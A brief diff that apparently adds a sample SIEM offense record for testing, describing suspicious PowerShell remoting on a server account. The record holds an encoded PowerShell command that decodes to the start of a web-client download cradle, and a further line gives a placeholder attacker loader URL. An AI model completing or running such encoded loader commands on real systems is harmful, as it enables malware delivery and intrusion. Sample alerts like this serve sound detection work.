@@ -1,0 +1,3 @@
+{"qid": 5000123, "categoryid": 8054, "log_source_id": 42, "start_time": "2026-07-24T05:11:19Z", "offense_source": "Anomalous PowerShell Remoting", "description": "Multiple PowerShell EncodedCommand invocations from an unusual source IP", "hostname": "APP-SRV-09", "username": "svc_web", "process": "powershell.exe", "command_line": "powershell.exe -EncodedCommand JABsAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA"}
+
+Attacker URL: https://malicious.example/loader
